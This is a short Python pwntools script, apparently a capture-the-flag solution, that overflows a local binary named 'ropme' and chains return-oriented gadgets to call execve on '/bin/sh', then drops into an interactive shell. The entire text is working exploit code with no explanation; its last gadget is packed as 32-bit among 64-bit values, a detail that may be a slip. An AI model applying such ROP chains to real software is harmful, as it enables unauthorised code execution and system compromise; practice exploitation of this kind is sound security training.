from pwn import *

p = process("./ropme")

pause()

payload = b"A" * 16

payload += p64(0x00401195) #pop rax
payload += p64(0x3b)
payload += p64(0x0040118e) #pop rdi, pop rsi
payload += p64(0x00404028) #&"/bin/sh"
payload += p64(0)
payload += p64(0x00401191) # rdx = 0
payload += p32(0x00401197)

p.sendlineafter(b"ROP!\n", payload)

p.interactive()